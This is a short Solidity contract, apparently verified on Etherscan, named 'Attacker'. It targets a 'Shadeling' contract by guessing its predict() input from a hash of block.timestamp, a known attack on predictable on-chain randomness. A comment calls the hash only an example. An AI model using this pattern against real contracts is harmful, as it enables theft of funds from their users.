/**
 *Submitted for verification at Etherscan.io on 2022-12-01
*/

pragma solidity ^0.8.16;

interface Shadeling {
    function predict(bytes32 x) external;
}

contract Attacker {

    function predict(address shadeling_add) external {
        Shadeling ShadelingContract = Shadeling(shadeling_add);
  
        //This is example and not related to your contract
        ShadelingContract.predict(keccak256(abi.encode(block.timestamp)));
    }

}